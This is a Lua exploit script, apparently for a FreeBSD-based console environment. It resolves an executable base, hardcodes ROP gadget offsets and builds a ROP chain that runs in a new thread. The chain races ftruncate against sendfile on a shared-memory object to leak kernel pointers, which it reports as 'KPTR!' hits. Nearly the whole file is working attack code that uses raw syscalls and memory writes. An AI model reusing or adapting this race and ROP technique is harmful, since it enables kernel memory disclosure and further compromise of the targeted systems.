-- CRASH_CLASS: HIGH
-- PROBE 1112a: sendfile + ftruncate race v2
--
-- Fixed: minimal sentinels, non-blocking both ends, smaller sendfile chunks

print("=== PROBE 1112a: SENDFILE+FTRUNCATE RACE V2 ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function split(val)
    if val == nil then return 0, 0 end
    if type(val) == "number" then
        if val < 0 then val = val + 0x100000000 end
        if val >= 0x100000000 then
            local hi = math.floor(val / 0x100000000)
            return val - hi * 0x100000000, hi
        end
        return val, 0
    end
    if type(val) == "table" and val.h then
        local h, l = val.h, val.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return l, h
    end
    return 0, 0
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local function eoff(off)
    local lo = elo + off; local hi = ehi
    if lo >= 0x100000000 then hi = hi + 1; lo = lo - 0x100000000 end
    return lo, hi
end

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local LARGE = 0x40000
local SMALL = 0x4000
local ITERS = 200

-- [A] First test: does sendfile work on SHM?
print("[A] sendfile sanity test")
local sc482 = mk(482)
local sc480 = mk(480)
local sc477 = mk(477)
local sc393 = mk(393)
local sc135 = mk(135)

local shm_fd = N(sc482(uint64(1), uint64(0x602), uint64(0x1FF)))
print("shm_fd=" .. shm_fd)
N(sc480(uint64(shm_fd), uint64(LARGE)))

-- Map and write minimal sentinels
local map = sc477(uint64(0), uint64(LARGE), uint64(3), uint64(1), uint64(shm_fd), uint64(0))
local map_n = N(map)
for p = 0, 15 do
    wd(map_n + p * 0x4000, 0xAA000000 + p)
    wd(map_n + p * 0x4000 + 4, 0xBB000000 + p)
end

-- Socketpair (SOCK_STREAM for sendfile)
local sv = memory.alloc(8)
wd(N(sv), 0); wd(N(sv) + 4, 0)
local sp_ret = N(sc135(uint64(1), uint64(1), uint64(0), sv))
local rd_fd = rd(N(sv)) or -1
local wr_fd = rd(N(sv) + 4) or -1
print(string.format("socketpair ret=%d rd=%d wr=%d", sp_ret, rd_fd, wr_fd))

-- Non-blocking BOTH ends via fcntl
-- F_GETFL=3, F_SETFL=4, O_NONBLOCK=4
local sc92 = mk(92)
pcall(function() sc92(uint64(rd_fd), uint64(4), uint64(4)) end)
pcall(function() sc92(uint64(wr_fd), uint64(4), uint64(4)) end)

-- Sendfile sanity: send 1 page
local sbytes = memory.alloc(8)
wd(N(sbytes), 0); wd(N(sbytes) + 4, 0)
local ok_sf, rv_sf = pcall(function()
    return sc393(uint64(shm_fd), uint64(wr_fd), uint64(0), uint64(0x4000),
        uint64(0), sbytes, uint64(0))
end)
local sf_ret = ok_sf and N(rv_sf) or -999
local sb_sent = rd(N(sbytes)) or 0
print(string.format("sendfile(1 page): ret=%d sbytes=%d", sf_ret, sb_sent))

-- Read it back
local rbuf = memory.alloc(0x4000)
local rn = N(rbuf)
local ok_r, rv_r = pcall(function()
    return mk(3)(uint64(rd_fd), uint64(rn), uint64(0x4000))
end)
local nread = ok_r and N(rv_r) or 0
print(string.format("read: %d bytes", nread))
if nread >= 8 then
    local d0 = rd(rn) or 0
    local d1 = rd(rn + 4) or 0
    print(string.format("first qword: 0x%08X%08X (expect AA000000 BB000000)", d1, d0))
end

if not alive() then print("DEAD after sanity test"); return end

-- [B] Race: child ftruncates while parent sendfiles + reads
print("")
print("[B] race setup")

local tcb = memory.alloc(0x1000)
local tcb_a = N(tcb)
local tcb_lo, tcb_hi = split(tcb)
-- Only fill first 64 bytes with self-pointers (8 qwords)
for i = 0, 56, 8 do wd(tcb_a + i, tcb_lo); wd(tcb_a + i + 4, tcb_hi) end
local fs_ptr = memory.alloc(8)
wd(N(fs_ptr), tcb_lo); wd(N(fs_ptr) + 4, tcb_hi)

local done_flag = memory.alloc(8)
wd(N(done_flag), 0); wd(N(done_flag) + 4, 0)

local pdr_lo, pdr_hi = eoff(0xC9DFE)
local psr_lo, psr_hi = eoff(0xD77D)
local par_lo, par_hi = eoff(0x992)
local bret_lo, bret_hi = eoff(0x42)
local mwr_lo, mwr_hi = eoff(0x92C67)
local stub_lo, stub_hi = split(stub)
local fsptr_lo, fsptr_hi = split(N(fs_ptr))
local done_lo, done_hi = split(N(done_flag))

local stk = memory.alloc(0x200000)
local sb = N(stk)
local ss = 0x100000
local rsp = sb + ss - ((sb + ss) % 16) - 8

local pos = 0
local function put(lo, hi)
    wd(rsp + pos * 8, lo)
    wd(rsp + pos * 8 + 4, hi or 0)
    pos = pos + 1
end

put(pdr_lo, pdr_hi); put(129, 0)
put(psr_lo, psr_hi); put(fsptr_lo, fsptr_hi)
put(par_lo, par_hi); put(165, 0)
put(stub_lo, stub_hi)

for i = 1, ITERS do
    put(pdr_lo, pdr_hi); put(shm_fd, 0)
    put(psr_lo, psr_hi); put(SMALL, 0)
    put(par_lo, par_hi); put(480, 0)
    put(stub_lo, stub_hi)
    put(pdr_lo, pdr_hi); put(shm_fd, 0)
    put(psr_lo, psr_hi); put(LARGE, 0)
    put(par_lo, par_hi); put(480, 0)
    put(stub_lo, stub_hi)
end

put(par_lo, par_hi); put(0xDEAD1112, 0)
put(pdr_lo, pdr_hi); put(done_lo, done_hi)
put(mwr_lo, mwr_hi)
put(pdr_lo, pdr_hi); put(0, 0)
put(par_lo, par_hi); put(431, 0)
put(stub_lo, stub_hi)

print(string.format("  %d entries", pos))

local par2 = memory.alloc(0x40)
local pa = N(par2)
for i = 0, 0x3C, 4 do wd(pa + i, 0) end
wq(pa, uint64(string.format("0x%X%08X", bret_hi, bret_lo)))
wq(pa + 8, uint64(0))
wq(pa + 0x10, uint64(sb))
wq(pa + 0x18, uint64(ss))
local tid = memory.alloc(8); wq(N(tid), uint64(0))
wq(pa + 0x30, tid)

print("[C] racing")
local ok1, rv1 = pcall(function() return mk(455)(par2, uint64(0x38)) end)
print("thr_new=" .. (ok1 and N(rv1) or -999))

local kptr_count = 0
local anom_count = 0
local send_ok = 0
local send_fail = 0
local total_read = 0
local round_done = 0

for round = 1, 500 do
    -- sendfile one page at offset 0x4000 (page 1, in the race zone)
    wd(N(sbytes), 0); wd(N(sbytes) + 4, 0)
    local ok2, rv2 = pcall(function()
        return sc393(uint64(shm_fd), uint64(wr_fd), uint64(0x4000), uint64(0x4000),
            uint64(0), sbytes, uint64(0))
    end)
    local ret2 = ok2 and N(rv2) or -999
    if ret2 >= -1 then send_ok = send_ok + 1 else send_fail = send_fail + 1 end

    -- Drain and scan
    local ok3, rv3 = pcall(function()
        return mk(3)(uint64(rd_fd), uint64(rn), uint64(0x4000))
    end)
    local nr = ok3 and N(rv3) or 0
    if nr > 0 then
        total_read = total_read + nr
        for off = 0, nr - 8, 8 do
            local lo = rd(rn + off) or 0
            local hi = rd(rn + off + 4) or 0
            if lo < 0 then lo = lo + 0x100000000 end
            if hi < 0 then hi = hi + 0x100000000 end
            if hi >= 0xFFFF8000 and hi ~= 0xFFFFFFFF then
                kptr_count = kptr_count + 1
                if kptr_count <= 20 then
                    print(string.format("  [KPTR!] r%d +%d: 0x%08X%08X", round, off, hi, lo))
                end
            end
        end
    end

    local df = rd(N(done_flag))
    if df and df ~= 0 then
        round_done = round
        break
    end
end

print("")
print(string.format("done=%d sends=%d/%d read=%d bytes", round_done, send_ok, send_fail, total_read))
print(string.format("kptrs=%d anom=%d", kptr_count, anom_count))
print("alive=" .. tostring(alive()))
print("=== PROBE 1112a COMPLETE ===")
